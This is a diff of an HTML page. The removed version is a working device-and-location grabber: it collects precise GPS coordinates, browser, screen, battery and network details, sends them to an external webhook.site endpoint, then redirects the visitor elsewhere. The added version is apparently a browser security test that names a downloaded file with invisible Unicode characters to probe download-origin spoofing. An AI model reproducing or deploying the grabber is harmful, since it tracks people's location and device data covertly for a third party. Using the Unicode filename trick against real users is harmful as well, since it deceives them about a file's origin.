@@ -1,148 +1,84 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<title>Advanced GET Webhook with Geolocation</title>
-</head>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chrome iOS Download Origin Test</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      padding: 24px;
+      text-align: center;
+    }
+
+    button {
+      background: #16834a;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 14px 22px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .info {
+      margin-top: 24px;
+      padding: 14px;
+      background: #f1f1f1;
+      border-radius: 8px;
+      text-align: left;
+    }
+  </style>
+</head>
 <body>
 
-<button onclick="send()">
-SEND
-</button>
+  <h2>Download Origin Regression Test</h2>
 
-<pre id="out"></pre>
+  <p>
+    Testing Unicode filename handling
+    in Chrome for iOS.
+  </p>
 
-<script>
-const WEBHOOK = "https://webhook.site/51056dab-66b0-49de-b851-02cfee543777";
+  <button onclick="runTest()">
+    Start Download Test
+  </button>
 
-// Fungsi Promise untuk mengambil lokasi presisi tinggi
-function getGeolocation() {
-    return new Promise((resolve) => {
-        if (!("geolocation" in navigator)) {
-            resolve("not supported");
-            return;
-        }
+  <div class="info">
+    <strong>Test configuration</strong>
+    <p>Unicode: U+3164, U+200B, U+2060</p>
+    <p>Expected: Actual download origin remains visible.</p>
+  </div>
 
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy, // Akurasi dalam meter
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
-                });
-            },
-            (error) => {
-                resolve({
-                    error: error.message,
-                    code: error.code
-                });
-            },
-            {
-                enableHighAccuracy: true, // Memaksa GPS hardware jika tersedia
-                timeout: 10000,           // Batas waktu 10 detik
-                maximumAge: 0             // Mencegah penggunaan cache lokasi lama
-            }
-        );
-    });
-}
+  <script>
+    function runTest() {
+      const filename =
+        "unicode-test-\u3164\u200B\u2060.txt";
 
-async function send() {
-    let data = {
-        event: "advanced_browser_info",
-        time_utc: new Date().toISOString(),
-        time_local: new Date().toString(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      const content =
+        "Chrome iOS download origin regression test.\n" +
+        "This file is harmless.";
 
-        url: location.href,
-        referrer: document.referrer || null,
-        title: document.title,
+      const blob = new Blob(
+        [content],
+        { type: "text/plain" }
+      );
 
-        user_agent: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
+      const url = URL.createObjectURL(blob);
 
-        language: navigator.language,
-        languages: navigator.languages,
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = filename;
 
-        online: navigator.onLine,
-        cookie_enabled: navigator.cookieEnabled,
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
 
-        cores: navigator.hardwareConcurrency || null,
-        memory: navigator.deviceMemory || null,
-        touch: ("ontouchstart" in window),
-
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            pixelRatio: devicePixelRatio
-        },
-
-        window: {
-            width: innerWidth,
-            height: innerHeight
-        },
-
-        visibility: document.visibilityState
-    };
-
-    // 1. Mengambil Geolocation Akurat
-    data.geolocation = await getGeolocation();
-
-    // 2. Battery Status (jika didukung)
-    try {
-        let battery = await navigator.getBattery();
-        data.battery = {
-            level: battery.level,
-            charging: battery.charging
-        };
-    } catch(e) {
-        data.battery = "not supported";
+      setTimeout(() => {
+        URL.revokeObjectURL(url);
+      }, 5000);
     }
-
-    // 3. Network Connection Info (jika didukung)
-    if (navigator.connection) {
-        data.connection = {
-            type: navigator.connection.type,
-            effective: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        };
-    }
-
-    // Menyusun URL Query Parameters
-    let params = new URLSearchParams();
-    for (let key in data) {
-        if (typeof data[key] === "object") {
-            params.append(key, JSON.stringify(data[key]));
-        } else {
-            params.append(key, data[key]);
-        }
-    }
-
-    let url = WEBHOOK + "?" + params.toString();
-
-    document.getElementById("out").textContent = url;
-
-    // Kirim request via GET
-    fetch(url, {
-        method: "GET",
-        mode: "no-cors"
-    });
-
-    // Pengalihan halaman
-    setTimeout(() => {
-        location.href = "https://mylocation.org/";
-    }, 1200);
-}
-</script>
+  </script>
 
 </body>
 </html>
